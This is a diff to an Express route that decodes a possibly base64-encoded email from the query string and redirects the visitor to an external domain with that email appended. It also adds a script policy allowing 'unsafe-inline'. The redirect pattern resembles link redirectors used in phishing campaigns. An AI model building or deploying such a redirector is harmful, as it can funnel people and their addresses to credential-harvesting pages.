@@ -1,6 +1,14 @@
 var appRoute = function (app) {
+  app.use(function (req, res, next) {
+    res.setHeader(
+      "Content-Security-Policy",
+      "script-src 'self' 'unsafe-inline' https://vercel.live"
+    );
+    next();
+  });
+
   app.all("/", function (req, res) {
-    const email = req.query.email;
+    let email = req.query.email; // Use let instead of const to reassign
 
     if (email && email.includes("=")) {
       email = Buffer.from(email, "base64").toString("utf-8");
@@ -9,11 +17,11 @@ var appRoute = function (app) {
 
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (email && emailRegex.test(email)) {
-      redirect_url =
+      const redirect_url =
         "https://mobileprosystem.com/&" + email.replace("@", "%40");
       res.redirect(redirect_url);
     } else {
-      res.send("Please provide a valid email");
+      res.status(400).send("Please provide a valid email"); // Add status code for error
     }
   });
 };
